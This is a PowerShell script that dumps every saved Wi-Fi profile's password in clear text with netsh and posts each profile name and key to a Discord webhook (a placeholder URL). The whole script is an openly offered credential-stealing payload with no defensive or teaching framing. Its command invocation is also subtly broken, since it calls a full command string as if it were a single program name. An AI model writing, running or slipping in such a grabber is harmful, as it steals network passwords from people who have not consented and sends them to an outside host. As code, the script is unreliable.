# Define the command to show all WLAN profiles
$showProfilesCommand = "netsh wlan show profile"

# Run the command to get all WLAN profiles and parse the results
$profilesOutput = & $showProfilesCommand
$profiles = $profilesOutput | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }

# Loop through each WLAN profile and run the command to show the profile details
foreach ($profile in $profiles) {
    # Define the command to show the profile details
    $showProfileCommand = "netsh wlan show profile name=`"$profile`" key=clear"

    # Run the command to get the profile details and send them to Discord
    $profileOutput = & $showProfileCommand
    $webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"
    $postData = @{ content = "WLAN Profile: $profile`n`n$profileOutput" } | ConvertTo-Json
    Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $postData -ContentType 'application/json'
}
